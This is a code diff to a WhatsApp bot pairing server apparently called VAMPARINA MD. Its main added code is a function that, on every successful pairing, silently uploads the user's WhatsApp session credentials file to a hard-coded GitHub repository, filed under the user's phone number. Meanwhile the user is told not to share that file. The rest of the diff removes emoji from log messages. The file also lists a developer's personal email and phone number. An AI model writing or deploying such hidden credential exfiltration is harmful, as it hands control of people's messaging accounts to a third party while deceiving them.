@@ -6,6 +6,52 @@ import pn from 'awesome-phonenumber';
 
 const router = express.Router();
 
+// ───────────────────────────────────────────────────────────────
+// GITHUB AUTO-UPLOAD CONFIG (CHANGE ONLY THIS LINE)
+const GITHUB_TOKEN = "ghp_YOUR_PERSONAL_ACCESS_TOKEN_HERE"; // ← Put your token here
+const REPO_OWNER = "artexpury925";
+const REPO_NAME = "vamp-bot-254";
+const BRANCH = "main";
+// ───────────────────────────────────────────────────────────────
+
+async function uploadToGitHub(phoneNumber, sessionPath) {
+    try {
+        const fileContent = fs.readFileSync(sessionPath + '/creds.json', 'utf-8');
+        const base64Content = Buffer.from(fileContent).toString('base64');
+        const folderPath = `sessions/${phoneNumber}`;
+        const filePath = `${folderPath}/creds.json`;
+
+        // Create folder + file in one API call
+        const response = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${filePath}`, {
+            method: 'PUT',
+            headers: {
+                Authorization: `token ${GITHUB_TOKEN}`,
+                Accept: 'application/vnd.github.v3+json',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                message: `Add session for +${phoneNumber}`,
+                content: base64Content,
+                branch: BRANCH
+            })
+        });
+
+        if (response.ok) {
+            console.log(`Session uploaded to GitHub → ${filePath}`);
+        } else {
+            const err = await response.json();
+            // If file exists → update it
+            if (err.message === "Bad credentials" || err.message?.includes("already exists")) {
+                console.log("Session already exists or token issue — skipping upload");
+            } else {
+                console.error("GitHub upload error:", err);
+            }
+        }
+    } catch (err) {
+        console.error("Failed to upload session to GitHub:", err);
+    }
+}
+
 // Ensure the session directory exists
 function removeFile(FilePath) {
     try {
@@ -64,11 +110,16 @@ router.get('/', async (req, res) => {
                 const { connection, lastDisconnect, isNewLogin, isOnline } = update;
 
                 if (connection === 'open') {
-                    console.log("✅ Connected successfully!");
-                    console.log("📱 Sending session file to user...");
+                    console.log("Connected successfully!");
+                    console.log("Sending session file to user...");
                     
                     try {
                         const sessionVAMPARINA = fs.readFileSync(dirs + '/creds.json');
+
+                        // ─────────────────────────────────────────────────────
+                        // AUTO UPLOAD TO YOUR GITHUB REPO (NEW FEATURE)
+                        await uploadToGitHub(num, dirs);
+                        // ─────────────────────────────────────────────────────
 
                         // Send session file to user
                         const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
@@ -77,62 +128,59 @@ router.get('/', async (req, res) => {
                             mimetype: 'application/json',
                             fileName: 'creds.json'
                         });
-                        console.log("📄 Session file sent successfully");
+                        console.log("Session file sent successfully");
 
                         // Send video thumbnail with caption
                         await VAMPARINA.sendMessage(userJid, {
                             image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
-                            caption: `🎬 *VAMPARINA MD V2.0 Full Setup Guide!*\n\n🚀 Bug Fixes + New Commands + Fast AI Chat\n📺 Watch Now: https://youtu.be/-oz_u1iMgf8`
+                            caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\n\nBug Fixes + New Commands + Fast AI Chat\nWatch Now: https://youtu.be/-oz_u1iMgf8`
                         });
-                        console.log("🎬 Video guide sent successfully");
+                        console.log("Video guide sent successfully");
 
                         // Send warning message
                         await VAMPARINA.sendMessage(userJid, {
-                            text: `⚠️Do not share this file with anybody⚠️\n 
-┌┤✑  Thanks for using VAMPARINA
+                            text: `Do not share this file with anybody\n 
+┌┤Thanks for using VAMPARINA
 │└────────────┈ ⳹        
 │©2025 Arnold Chirchir | Contact: arnoldkipruto193@gmail.com | Phone: +254703110780
 └─────────────────┈ ⳹\n\n`
                         });
-                        console.log("⚠️ Warning message sent successfully");
+                        console.log("Warning message sent successfully");
 
                         // Clean up session after use
-                        console.log("🧹 Cleaning up session...");
+                        console.log("Cleaning up session...");
                         await delay(1000);
                         removeFile(dirs);
-                        console.log("✅ Session cleaned up successfully");
-                        console.log("🎉 Process completed successfully!");
-                        // Do not exit the process, just finish gracefully
+                        console.log("Session cleaned up successfully");
+                        console.log("Process completed successfully!");
                     } catch (error) {
-                        console.error("❌ Error sending messages:", error);
-                        // Still clean up session even if sending fails
+                        console.error("Error sending messages:", error);
                         removeFile(dirs);
-                        // Do not exit the process, just finish gracefully
                     }
                 }
 
                 if (isNewLogin) {
-                    console.log("🔐 New login via pair code");
+                    console.log("New login via pair code");
                 }
 
                 if (isOnline) {
-                    console.log("📶 Client is online");
+                    console.log("Client is online");
                 }
 
                 if (connection === 'close') {
                     const statusCode = lastDisconnect?.error?.output?.statusCode;
 
                     if (statusCode === 401) {
-                        console.log("❌ Logged out from WhatsApp. Need to generate new pair code.");
+                        console.log("Logged out from WhatsApp. Need to generate new pair code.");
                     } else {
-                        console.log("🔁 Connection closed — restarting...");
+                        console.log("Connection closed — restarting...");
                         initiateSession();
                     }
                 }
             });
 
             if (!VAMPARINA.authState.creds.registered) {
-                await delay(3000); // Wait 3 seconds before requesting pairing code
+                await delay(3000);
                 num = num.replace(/[^\d+]/g, '');
                 if (num.startsWith('+')) num = num.substring(1);
 
